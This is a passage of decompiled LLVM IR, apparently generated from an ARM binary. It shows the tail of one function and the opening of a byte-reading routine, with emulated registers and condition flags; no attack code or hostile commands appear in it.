  %v0_11bdc = load i32, i32* %r6.global-to-local, align 4
  %v1_11bdc = inttoptr i32 %v0_11bdc to i32*
  store i32 112, i32* %v1_11bdc, align 4
  %v3_11bdc = add i32 %v0_11bdc, 4
  %v4_11bdc = inttoptr i32 %v3_11bdc to i32*
  %v5_11bdc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_11bdc, i32* %v4_11bdc, align 4
  %v0_11be0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11be0 = load i32, i32* %r6.global-to-local, align 4
  %v2_11be0 = add i32 %v1_11be0, 8
  %v3_11be0 = inttoptr i32 %v2_11be0 to i32*
  store i32 %v0_11be0, i32* %v3_11be0, align 4
  %v0_11be4 = load i32, i32* %r6.global-to-local, align 4
  %v1_11be4 = add i32 %v0_11be4, 12
  store i32 %v1_11be4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11b60, %.thread102, %dec_label_pc_11bc8
  %v1_11bf4.pre = phi i32 [ %v2_11760, %.thread102 ], [ %v1_11be4, %dec_label_pc_11bc8 ], [ %v1_11bf4.pre.pre, %dec_label_pc_11b60 ]
  %v2_11be8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_11be8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11bec

dec_label_pc_11bec:                               ; preds = %dec_label_pc_11bec, %dec_label_pc_11be8
  %v0_11bec = phi i32 [ %v2_11be8, %dec_label_pc_11be8 ], [ %v4_11bec, %dec_label_pc_11bec ]
  %stack_var_-188.0 = phi i32 [ %v3_11698, %dec_label_pc_11be8 ], [ %v2_11bf8, %dec_label_pc_11bec ]
  %v1_11bec = inttoptr i32 %v0_11bec to i32*
  %v2_11bec = load i32, i32* %v1_11bec, align 4
  store i32 %v2_11bec, i32* %r3.global-to-local, align 4
  %v4_11bec = add i32 %v0_11bec, 12
  store i32 %v4_11bec, i32* %r2.global-to-local, align 4
  %v3_11bf4 = icmp ult i32 %v4_11bec, %v1_11bf4.pre
  %v2_11bf8 = sub i32 %stack_var_-188.0, %v2_11bec
  store i32 %v2_11bf8, i32* %ip.global-to-local, align 4
  br i1 %v3_11bf4, label %dec_label_pc_11bec, label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bec
  %v3_11c04 = load i8, i8* %stack_var_-50, align 1
  %v4_11c04 = sext i8 %v3_11c04 to i32
  store i32 %v4_11c04, i32* %r3.global-to-local, align 4
  store i32 %v4_11c04, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c08 = icmp slt i8 %v3_11c04, 0
  store i1 %v1_11c08, i1* %cpsr_n.global-to-local, align 1
  %v2_11c08 = icmp eq i8 %v3_11c04, 0
  store i1 %v2_11c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c08, label %bb223, label %bb222

bb222:                                            ; preds = %dec_label_pc_11c04
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_11c04, %bb222
  %v1_11c54 = phi i32 [ %v4_11c04, %dec_label_pc_11c04 ], [ 1, %bb222 ]
  %v2_11c10 = sub i32 %v2_11bf8, %v1_11c54
  store i32 %v2_11c10, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_11c18 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_11c18, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c1c = icmp slt i32 %v2_11c10, 0
  store i1 %v1_11c1c, i1* %cpsr_n.global-to-local, align 1
  %v2_11c1c = icmp eq i32 %v2_11c10, 0
  store i1 %v2_11c1c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp224 = icmp slt i32 %v2_11c10, 1
  br i1 %tmp224, label %dec_label_pc_11c7c, label %dec_label_pc_11c30

dec_label_pc_11c30:                               ; preds = %bb223
  %v0_11c30 = load i32, i32* %fp.global-to-local, align 4
  %v1_11c30 = add i32 %v0_11c30, 12
  %v2_11c30 = inttoptr i32 %v1_11c30 to i32*
  %v3_11c30 = load i32, i32* %v2_11c30, align 4
  store i32 %v3_11c30, i32* %r3.global-to-local, align 4
  %v1_11c34 = and i32 %v3_11c30, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11c34 = icmp eq i32 %v1_11c34, 0
  store i1 %v2_11c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c34, label %dec_label_pc_11c4c, label %dec_label_pc_11c3c

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c30
  store i32 ptrtoint (i32* @global_var_16f7f.533 to i32), i32* %r3.global-to-local, align 4
  %v1_11c40 = add i32 %v1_11bf4.pre, 12
  store i32 %v1_11c40, i32* %r5.global-to-local, align 4
  %v1_11c44 = inttoptr i32 %v1_11bf4.pre to i32*
  store i32 160, i32* %v1_11c44, align 4
  %v3_11c44 = add i32 %v1_11bf4.pre, 4
  %v4_11c44 = inttoptr i32 %v3_11c44 to i32*
  %v5_11c44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11c44, i32* %v4_11c44, align 4
  %v6_11c44 = add i32 %v1_11bf4.pre, 8
  %v7_11c44 = inttoptr i32 %v6_11c44 to i32*
  %v8_11c44 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_11c44, i32* %v7_11c44, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c30
  %v1_11c4c = add i32 %v0_11c30, 16
  %v2_11c4c = inttoptr i32 %v1_11c4c to i32*
  %v3_11c4c = load i32, i32* %v2_11c4c, align 4
  store i32 %v3_11c4c, i32* %r3.global-to-local, align 4
  %v1_11c50 = add i32 %v3_11c4c, -48
  %v3_11c50 = sub i32 47, %v3_11c4c
  %v4_11c50 = and i32 %v3_11c50, %v3_11c4c
  %v5_11c50 = icmp slt i32 %v4_11c50, 0
  store i1 %v5_11c50, i1* %cpsr_v.global-to-local, align 1
  %v6_11c50 = icmp slt i32 %v1_11c50, 0
  store i1 %v6_11c50, i1* %cpsr_n.global-to-local, align 1
  %v7_11c50 = icmp eq i32 %v3_11c4c, 48
  store i1 %v7_11c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c50, label %dec_label_pc_11c60, label %bb225

bb225:                                            ; preds = %dec_label_pc_11c4c
  store i32 %v2_11bf8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11c7c

dec_label_pc_11c60:                               ; preds = %dec_label_pc_11c4c
  %v3_11c60 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_11bf4.pre, i32* %r5.global-to-local, align 4
  %v2_11c68 = add i32 %v3_11c60, %v2_11c10
  store i32 %v2_11c68, i32* %r3.global-to-local, align 4
  store i32 %v2_11c68, i32* %stack_var_-168, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c88
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11cb8

dec_label_pc_11c7c:                               ; preds = %bb225, %bb223
  store i32 %v1_11bf4.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c60, %dec_label_pc_11c3c, %dec_label_pc_11c7c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_11674, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %dec_label_pc_11cb0, %dec_label_pc_11c80
  %v0_11c88 = phi i32 [ %v1_11ca8, %dec_label_pc_11cb0 ], [ %v2_11674, %dec_label_pc_11c80 ]
  %v1_11c88 = inttoptr i32 %v0_11c88 to i32*
  %v2_11c88 = load i32, i32* %v1_11c88, align 4
  store i32 %v2_11c88, i32* %r1.global-to-local, align 4
  %v3_11c88 = add i32 %v0_11c88, 4
  %v4_11c88 = inttoptr i32 %v3_11c88 to i32*
  %v5_11c88 = load i32, i32* %v4_11c88, align 4
  store i32 %v5_11c88, i32* %r2.global-to-local, align 4
  %v6_11c88 = add i32 %v0_11c88, 8
  %v7_11c88 = inttoptr i32 %v6_11c88 to i32*
  %v8_11c88 = load i32, i32* %v7_11c88, align 4
  store i32 %v8_11c88, i32* %r3.global-to-local, align 4
  %v2_11c8c = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_11c8c, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 72860, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_11c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_11c9c = add i32 %v0_11c9c, 4
  %v2_11c9c = inttoptr i32 %v1_11c9c to i32*
  %v3_11c9c = load i32, i32* %v2_11c9c, align 4
  store i32 %v3_11c9c, i32* %r3.global-to-local, align 4
  %v0_11ca0 = load i32, i32* %r0.global-to-local, align 4
  %v2_11ca0 = sub i32 %v0_11ca0, %v3_11c9c
  %v4_11ca0 = xor i32 %v0_11ca0, %v3_11c9c
  %v5_11ca0 = xor i32 %v2_11ca0, %v0_11ca0
  %v6_11ca0 = and i32 %v5_11ca0, %v4_11ca0
  %v7_11ca0 = icmp slt i32 %v6_11ca0, 0
  store i1 %v7_11ca0, i1* %cpsr_v.global-to-local, align 1
  %v8_11ca0 = icmp slt i32 %v2_11ca0, 0
  store i1 %v8_11ca0, i1* %cpsr_n.global-to-local, align 1
  %v9_11ca0 = icmp eq i32 %v0_11ca0, %v3_11c9c
  store i1 %v9_11ca0, i1* %cpsr_z.global-to-local, align 1
  %v0_11ca4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ca4 = add i32 %v0_11ca4, %v0_11ca0
  store i32 %v2_11ca4, i32* %r6.global-to-local, align 4
  %v1_11ca8 = add i32 %v0_11c9c, 12
  store i32 %v1_11ca8, i32* %r4.global-to-local, align 4
  br i1 %v9_11ca0, label %dec_label_pc_11cb0, label %dec_label_pc_11c74

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c88
  %v1_11cb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_11cb0 = sub i32 %v1_11ca8, %v1_11cb0
  %v3_11cb0 = icmp ult i32 %v1_11ca8, %v1_11cb0
  %v4_11cb0 = xor i32 %v1_11cb0, %v1_11ca8
  %v5_11cb0 = xor i32 %v2_11cb0, %v1_11ca8
  %v6_11cb0 = and i32 %v5_11cb0, %v4_11cb0
  %v7_11cb0 = icmp slt i32 %v6_11cb0, 0
  store i1 %v7_11cb0, i1* %cpsr_v.global-to-local, align 1
  %v8_11cb0 = icmp slt i32 %v2_11cb0, 0
  store i1 %v8_11cb0, i1* %cpsr_n.global-to-local, align 1
  %v9_11cb0 = icmp eq i32 %v1_11ca8, %v1_11cb0
  store i1 %v9_11cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11cb0, label %dec_label_pc_11c88, label %dec_label_pc_11cb8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11cb0, %dec_label_pc_11c74
  %v0_11cb8 = phi i32 [ -1, %dec_label_pc_11c74 ], [ %v2_11ca4, %dec_label_pc_11cb0 ]
  store i32 %v0_11cb8, i32* %r0.global-to-local, align 4
  %v8_11cc4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_11cc4, i32* @r6, align 4
  store i32 %v6_11660, i32* @r7, align 4
  store i32 %v9_11660, i32* @r8, align 4
  store i32 %v12_11660, i32* @sb, align 4
  store i32 %v15_11660, i32* @sl, align 4
  store i32 %v18_11660, i32* @fp, align 4
  ret i32 %v0_11cb8

; uselistorder directives
  uselistorder i32 %v0_11cb8, { 1, 0 }
  uselistorder i32 %v2_11cb0, { 1, 0 }
  uselistorder i32 %v1_11cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_11ca8, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_11ca0, { 1, 0 }
  uselistorder i32 %v0_11ca0, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_11c9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11c88, { 2, 1, 0 }
  uselistorder i32 %v3_11c4c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_11bf8, { 0, 1, 3, 2 }
  uselistorder i32 %v4_11bec, { 1, 2, 0 }
  uselistorder i32 %v0_11bec, { 1, 0 }
  uselistorder i32 %v1_11bf4.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_11bac, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_11b90, { 1, 0 }
  uselistorder i32 %storemerge137, { 1, 0 }
  uselistorder i32 %v0_11b6c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_11b60, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11b3c, { 1, 0 }
  uselistorder i32 %v1_11b3c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11b38, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_11b30, { 1, 0 }
  uselistorder i32 %v0_11b28, { 3, 0, 1, 2 }
  uselistorder i32 %v0_11b10, { 1, 0 }
  uselistorder i32 %v1_11aec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11aec, { 1, 0, 2 }
  uselistorder i32 %v1_11ac8, { 0, 2, 1 }
  uselistorder i32 %v0_11ac4, { 3, 0, 1, 2 }
  uselistorder i1 %v2_11aa8, { 2, 1, 0 }
  uselistorder i32 %v2_11a00, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_119f0, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_11a94, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_1199c, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_11984, { 1, 0 }
  uselistorder i32 %v2_1197c, { 1, 2, 0 }
  uselistorder i32 %v1_11970, { 1, 0 }
  uselistorder i32 %v0_11970, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_11968, { 1, 0, 2 }
  uselistorder i32 %v0_11960, { 3, 0, 1, 2 }
  uselistorder i1 %v3_11944, { 1, 0 }
  uselistorder i32 %v2_11944, { 1, 0 }
  uselistorder i32 %v2_11940, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_1192c, { 1, 0 }
  uselistorder i32 %v1_11930, { 2, 1, 0 }
  uselistorder i1 %v2_11920, { 1, 0 }
  uselistorder i32 %v0_1191c, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_11904, { 1, 0 }
  uselistorder i32 %v1_118f8, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_118b0, { 1, 2, 0 }
  uselistorder i32 %v2_118ac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_118ac, { 1, 0, 2 }
  uselistorder i1 %v2_11898, { 1, 0 }
  uselistorder i32 %v0_11890, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_118a0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_11880, { 1, 0 }
  uselistorder i32 %v0_11870, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_11868, { 1, 0 }
  uselistorder i1 %v5_11868, { 1, 0 }
  uselistorder i32 %v0_11864, { 0, 2, 1, 3 }
  uselistorder i32 %v0_11858, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v0_11854, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v0_11830, { 1, 0 }
  uselistorder i32 %v4_11808, { 1, 0 }
  uselistorder i32 %v3_11808, { 1, 0 }
  uselistorder i32 %v0_1173c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_11670, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 7, 8, 9, 6, 10, 4, 11, 12, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 1, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 52, 44, 45, 53, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 8, 9, 10, 5, 6, 7, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 16, 14, 18, 17, 7, 8, 15, 9, 10, 11, 13, 12, 19, 20, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i8 69, { 0, 2, 3, 1 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_11c80, { 2, 0, 1 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_11be8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b38, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_11b10, { 1, 0 }
  uselistorder label %dec_label_pc_11aec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11ad0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11aa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11aa0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_119c4, { 1, 0 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_119b4, { 1, 0 }
  uselistorder label %dec_label_pc_119a8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %dec_label_pc_118d0, { 2, 0, 1 }
  uselistorder label %bb191, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %.thread102, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %bb179, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
}

define i32 @function_11cc8(i8* %arg1) local_unnamed_addr {
dec_label_pc_11cc8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_11cc8 = load i32, i32* @r4, align 4
  store i32 %v3_11cc8, i32* %stack_var_-8, align 4
  %v0_11ccc = load i32, i32* @r0, align 4
  %v1_11ccc = add i32 %v0_11ccc, 16
  %v2_11ccc = inttoptr i32 %v1_11ccc to i32*
  %v3_11ccc = load i32, i32* %v2_11ccc, align 4
  store i32 %v3_11ccc, i32* %r2.global-to-local, align 4
  %v1_11cd0 = add i32 %v0_11ccc, 24
  %v2_11cd0 = inttoptr i32 %v1_11cd0 to i32*
  %v3_11cd0 = load i32, i32* %v2_11cd0, align 4
  %v3_11cd4 = icmp ult i32 %v3_11ccc, %v3_11cd0
  store i32 %v0_11ccc, i32* @r4, align 4
  br i1 %v3_11cd4, label %bb, label %dec_label_pc_11cec

bb:                                               ; preds = %dec_label_pc_11cc8
  %v2_11cdc = inttoptr i32 %v3_11ccc to i8*
  %v3_11cdc = load i8, i8* %v2_11cdc, align 1
  %v4_11cdc = zext i8 %v3_11cdc to i32
  store i32 %v4_11cdc, i32* %r0.global-to-local, align 4
  %v6_11cdc = add i32 %v3_11ccc, 1
  store i32 %v6_11cdc, i32* %r2.global-to-local, align 4
  store i32 %v6_11cdc, i32* %v2_11ccc, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11cec:                               ; preds = %dec_label_pc_11cc8
  %v1_11cec = inttoptr i32 %v0_11ccc to i8*
  %v2_11cec = load i8, i8* %v1_11cec, align 1
  %v3_11cec = zext i8 %v2_11cec to i32
  %v1_11cf0 = and i32 %v3_11cec, 131
  %tmp22 = icmp ugt i32 %v1_11cf0, 128
  br i1 %tmp22, label %dec_label_pc_11d0c, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11cec
  store i32 128, i32* @r1, align 4
  %v0_11d00 = call i32 @function_13550()
  store i32 %v0_11d00, i32* %r0.global-to-local, align 4
  %v2_11d04 = icmp eq i32 %v0_11d00, 0
  br i1 %v2_11d04, label %dec_label_pc_11cfc.dec_label_pc_11d0c_crit_edge, label %dec_label_pc_11de8

dec_label_pc_11cfc.dec_label_pc_11d0c_crit_edge:  ; preds = %dec_label_pc_11cfc
  %v0_11d0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11d0c

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11cfc.dec_label_pc_11d0c_crit_edge, %dec_label_pc_11cec
  %v2_11d58 = phi i32 [ %v0_11d0c.pre, %dec_label_pc_11cfc.dec_label_pc_11d0c_crit_edge ], [ %v0_11ccc, %dec_label_pc_11cec ]
  %v1_11d0c = inttoptr i32 %v2_11d58 to i8*
  %v2_11d0c = load i8, i8* %v1_11d0c, align 1
  %v3_11d0c = zext i8 %v2_11d0c to i32
  store i32 %v3_11d0c, i32* %r2.global-to-local, align 4
  %v1_11d10 = add i32 %v2_11d58, 1
  %v2_11d10 = inttoptr i32 %v1_11d10 to i8*
  %v3_11d10 = load i8, i8* %v2_11d10, align 1
  %v4_11d10 = zext i8 %v3_11d10 to i32
  %v4_11d14 = mul nuw nsw i32 %v4_11d10, 256
  %v5_11d14 = or i32 %v4_11d14, %v3_11d0c
  store i32 %v5_11d14, i32* %r2.global-to-local, align 4
  %v1_11d18 = and i32 %v3_11d0c, 2
  %v2_11d18 = icmp eq i32 %v1_11d18, 0
  br i1 %v2_11d18, label %dec_label_pc_11d48, label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11d0c
  %tmp23 = urem i8 %v2_11d0c, 2
  %v1_11d20 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_11d20
  %v4_11d24 = and i32 %tmp18, 4
  %v5_11d24 = add i32 %v4_11d24, %v2_11d58
  %v1_11d28 = add i32 %v5_11d24, 36
  %v2_11d28 = inttoptr i32 %v1_11d28 to i8*
  %v3_11d28 = load i8, i8* %v2_11d28, align 1
  %v4_11d28 = zext i8 %v3_11d28 to i32
  %v1_11d2c = add nsw i32 %v5_11d14, -1
  store i32 %v1_11d2c, i32* %r2.global-to-local, align 4
  %v3_11d30 = sdiv i32 %v1_11d2c, 256
  store i32 %v3_11d30, i32* %r1.global-to-local, align 4
  store i32 %v4_11d28, i32* %r0.global-to-local, align 4
  %v2_11d3c = add i32 %v2_11d58, 40
  %v3_11d3c = inttoptr i32 %v2_11d3c to i32*
  store i32 0, i32* %v3_11d3c, align 4
  %v0_11d40 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d40 = trunc i32 %v0_11d40 to i8
  %v2_11d40 = load i32, i32* @r4, align 4
  %v3_11d40 = add i32 %v2_11d40, 1
  %v4_11d40 = inttoptr i32 %v3_11d40 to i8*
  store i8 %v1_11d40, i8* %v4_11d40, align 1
  br label %dec_label_pc_11d7c

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d0c
  %v1_11d48 = add i32 %v2_11d58, 16
  store i32 %v1_11d48, i32* %r1.global-to-local, align 4
  %v1_11d4c = inttoptr i32 %v1_11d48 to i32*
  %v2_11d4c = load i32, i32* %v1_11d4c, align 4
  store i32 %v2_11d4c, i32* %r1.global-to-local, align 4
  %v3_11d4c = add i32 %v2_11d58, 20
  %v4_11d4c = inttoptr i32 %v3_11d4c to i32*
  %v5_11d4c = load i32, i32* %v4_11d4c, align 4
  %v9_11d50 = icmp eq i32 %v5_11d4c, %v2_11d4c
  br i1 %v9_11d50, label %dec_label_pc_11d60, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11d48
  %v2_11d54 = inttoptr i32 %v2_11d4c to i8*
  %v3_11d54 = load i8, i8* %v2_11d54, align 1
  %v4_11d54 = zext i8 %v3_11d54 to i32
  store i32 %v4_11d54, i32* %r0.global-to-local, align 4
  %v6_11d54 = add i32 %v2_11d4c, 1
  store i32 %v6_11d54, i32* %r1.global-to-local, align 4
  store i32 %v6_11d54, i32* %v1_11d4c, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d48
  %v1_11d60 = add i32 %v2_11d58, 4
  %v2_11d60 = inttoptr i32 %v1_11d60 to i32*
  %v3_11d60 = load i32, i32* %v2_11d60, align 4
  %v4_11d68 = icmp eq i32 %v3_11d60, -2
  br i1 %v4_11d68, label %dec_label_pc_11d6c, label %dec_label_pc_11d84

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d60
  %v1_11d6c = or i32 %v5_11d14, 4
  store i32 %v1_11d6c, i32* %r2.global-to-local, align 4
  store i8 %v3_11d10, i8* %v2_11d10, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d7c

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d20, %dec_label_pc_11d6c
  %v0_11d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_11d7c = trunc i32 %v0_11d7c to i8
  %v2_11d7c = load i32, i32* @r4, align 4
  %v3_11d7c = inttoptr i32 %v2_11d7c to i8*
  store i8 %v1_11d7c, i8* %v3_11d7c, align 1
  br label %dec_label_pc_11dec

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d60
  %v1_11d84 = and i32 %v4_11d14, 768
  %v2_11d84 = icmp eq i32 %v1_11d84, 0
  br i1 %v2_11d84, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_11d84
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11d84, %bb19
  store i32 73104, i32* @lr, align 4
  %v1_11d8c = xor i1 %v2_11d84, true
  call void @__pseudo_cond_branch(i1 %v1_11d8c, i32 ptrtoint (i32* @global_var_e7a0.537 to i32))
  %v0_11d90 = load i32, i32* @r4, align 4
  %v1_11d90 = add i32 %v0_11d90, 8
  store i32 %v1_11d90, i32* %r2.global-to-local, align 4
  %v1_11d94 = inttoptr i32 %v1_11d90 to i32*
  %v2_11d94 = load i32, i32* %v1_11d94, align 4
  store i32 %v2_11d94, i32* %r2.global-to-local, align 4
  %v3_11d94 = add i32 %v0_11d90, 12
  %v4_11d94 = inttoptr i32 %v3_11d94 to i32*
  %v5_11d94 = load i32, i32* %v4_11d94, align 4
  %v9_11d98 = icmp eq i32 %v5_11d94, %v2_11d94
